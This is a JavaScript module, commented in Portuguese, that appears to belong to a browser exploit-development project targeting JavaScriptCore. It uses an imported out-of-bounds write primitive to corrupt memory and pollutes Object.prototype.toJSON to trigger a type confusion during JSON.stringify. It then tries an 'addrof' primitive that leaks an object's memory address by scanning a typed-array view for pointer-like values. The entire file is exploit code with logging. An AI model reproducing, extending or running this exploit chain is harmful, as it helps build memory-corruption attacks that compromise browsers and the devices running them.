// js/script3/testArrayBufferVictimCrash.mjs (v6 - Probe Logic Fix)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v6_ProbeLogicFix";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256;

// toJSON_call_details_v28 será inicializado em executeArrayBufferVictimCrashTest
// e modificado pela sonda.
let toJSON_call_details_v28 = null;
let object_to_leak_A = null;
const prep_val_1 = 0.5;
const prep_val_2 = 1.5;

function toJSON_V28_Probe_FixedLogic() {
    if (!toJSON_call_details_v28) {
        // Isso não deveria acontecer se inicializado corretamente antes de stringify
        console.error("toJSON_call_details_v28 não inicializado!");
        toJSON_call_details_v28 = {}; // Fallback mínimo
    }

    toJSON_call_details_v28.probe_variant = "V28_Probe_FixedLogic"; // Identificador da sonda
    toJSON_call_details_v28.probe_called_count = (toJSON_call_details_v28.probe_called_count || 0) + 1;
    const current_this_type = Object.prototype.toString.call(this);
    toJSON_call_details_v28.last_this_type_in_probe = current_this_type; // Tipo da chamada atual

    try {
        if (this === victim_ab_ref_for_original_test && current_this_type === '[object Object]') {
            // Heisenbug condition met in this specific call to the probe
            toJSON_call_details_v28.heisenbug_condition_met_in_probe = true; // Marcar que a condição principal foi ATENDIDA
            toJSON_call_details_v28.this_type_when_heisenbug_met = current_this_type; // Gravar o tipo quando a Heisenbug foi confirmada

            // Log apenas na primeira vez que a condição da Heisenbug é atendida para evitar spam
            if (!toJSON_call_details_v28.logged_heisenbug_details) {
                logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG DETECTADA NA SONDA! Tipo de 'this': ${current_this_type}. Tentando escritas...`, "vuln");
                toJSON_call_details_v28.logged_heisenbug_details = true;
            }

            try {
                this[10] = prep_val_1;
                toJSON_call_details_v28.prep_val_1_written_in_probe = true; // Só vai para true
                this[11] = prep_val_2;
                toJSON_call_details_v28.prep_val_2_written_in_probe = true; // Só vai para true
            } catch (e_prep) {
                if(!toJSON_call_details_v28.error_in_probe) toJSON_call_details_v28.error_in_probe = "";
                toJSON_call_details_v28.error_in_probe += `PrepErr: ${e_prep.message}; `;
            }

            if (object_to_leak_A) {
                this[0] = object_to_leak_A;
                toJSON_call_details_v28.obj_A_written_in_probe = true; // Só vai para true
            }
        } else if (this === victim_ab_ref_for_original_test) {
            // Chamado no objeto vítima, mas não (ou não mais) como [object Object]
            if (!toJSON_call_details_v28.logged_heisenbug_details) { // Se a Heisenbug nunca foi logada, logar esta falha
                 logS3(`[${toJSON_call_details_v28.probe_variant}] Sonda chamada no victim_ab, mas tipo é ${current_this_type}`, "info");
            }
        }
    } catch (e) {
        if(!toJSON_call_details_v28.error_in_probe) toJSON_call_details_v28.error_in_probe = "";
        toJSON_call_details_v28.error_in_probe += `MainProbeErr: ${e.name}: ${e.message}; `;
    }
    return { minimal_probe_executed: true };
}

let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof com Lógica de Sonda Corrigida ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Inicializar toJSON_call_details_v28 AQUI, uma vez por execução do teste principal
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_FixedLogic_Initial", // Para sabermos que foi inicializado
        probe_called_count: 0,
        last_this_type_in_probe: "N/A",
        heisenbug_condition_met_in_probe: false, // Se a condição da Heisenbug foi atendida em alguma chamada da sonda
        this_type_when_heisenbug_met: "N/A",
        obj_A_written_in_probe: false,
        prep_val_1_written_in_probe: false,
        prep_val_2_written_in_probe: false,
        error_in_probe: null,
        logged_heisenbug_details: false
    };

    victim_ab_ref_for_original_test = null;
    object_to_leak_A = { marker: "ObjA_v6_FixedProbe", id: Date.now() };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        found_at_index: -1,
        message: "Addrof: Não tentado ou Heisenbug falhou."
    };
        
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPattern = 0.123456789101112;
    const ITERATIVE_READ_COUNT = 16;

    try {
        await triggerOOB_primitive({ force_reinit: true });
         if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_FixedLogic.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_FixedLogic,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_FixedLogic.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // Log detalhado do objeto toJSON_call_details_v28 após stringify
            logS3(`  Detalhes COMPLETOS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);


            if (toJSON_call_details_v28 && toJSON_call_details_v28.heisenbug_condition_met_in_probe) {
                logS3(`  HEISENBUG CONFIRMADA (via flag da sonda)! Tipo quando Heisenbug ocorreu: ${toJSON_call_details_v28.this_type_when_heisenbug_met}`, "vuln");
                logS3(`    Status das escritas na sonda: ObjA: ${toJSON_call_details_v28.obj_A_written_in_probe}, PrepVal1: ${toJSON_call_details_v28.prep_val_1_written_in_probe}, PrepVal2: ${toJSON_call_details_v28.prep_val_2_written_in_probe}`, "info");
                if(toJSON_call_details_v28.error_in_probe) logS3(`    Erro(s) na sonda: ${toJSON_call_details_v28.error_in_probe}`, "error");

                if (!toJSON_call_details_v28.obj_A_written_in_probe && !toJSON_call_details_v28.prep_val_1_written_in_probe && !toJSON_call_details_v28.prep_val_2_written_in_probe) {
                    logS3("    ALERTA: Heisenbug detectada, mas nenhuma flag de escrita da sonda está como true. Isso é inesperado.", "error");
                }

                logS3(`PASSO 3: Lendo iterativamente os primeiros ${ITERATIVE_READ_COUNT} slots de float64_view_on_victim...`, "warn", FNAME_CURRENT_TEST);
                let foundPotentialPointer = false;
                for (let i = 0; i < ITERATIVE_READ_COUNT; i++) {
                    if (i >= float64_view_on_victim.length) break; 

                    const val_double = float64_view_on_victim[i];
                    let temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
                    const val_int64 = new AdvancedInt64(new Uint32Array(temp_buf)[0], new Uint32Array(temp_buf)[1]);
                    
                    logS3(`  view[${i}]: double=${val_double}, int64=${val_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                    if (toJSON_call_details_v28.obj_A_written_in_probe && val_double !== 0 && val_double !== fillPattern &&
                        (val_int64.high() < 0x00020000 || (val_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                        logS3(`  !!!! VALOR LIDO em view[${i}] PARECE UM PONTEIRO POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                        if (!foundPotentialPointer) { 
                            addrof_result.success = true;
                            addrof_result.leaked_address_as_double = val_double;
                            addrof_result.leaked_address_as_int64 = val_int64;
                            addrof_result.found_at_index = i;
                            addrof_result.message = `Heisenbug confirmada E leitura de view[${i}] sugere um ponteiro.`;
                            foundPotentialPointer = true; 
                        }
                    }
                }

                if (addrof_result.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? Encontrado @${addrof_result.found_at_index}!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                     addrof_result.message = "Heisenbug ok, mas nenhum ponteiro promissor encontrado na varredura da view (ou escritas na sonda não ocorreram).";
                }

            } else {
                let msg = "Condição da Heisenbug não foi confirmada pela flag da sonda (heisenbug_condition_met_in_probe).";
                if(toJSON_call_details_v28) msg += ` Último tipo obs: ${toJSON_call_details_v28.last_this_type_in_probe}. Contagem de chamadas da sonda: ${toJSON_call_details_v28.probe_called_count}.`;
                addrof_result.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Index=${addrof_result.found_at_index}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_A = null;
        victim_ab_ref_for_original_test = null;
        toJSON_call_details_v28 = null; // Limpar para a próxima execução (se houver)
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28, // Retorna o objeto de detalhes completo
        addrof_attempt_result: addrof_result
    };
}
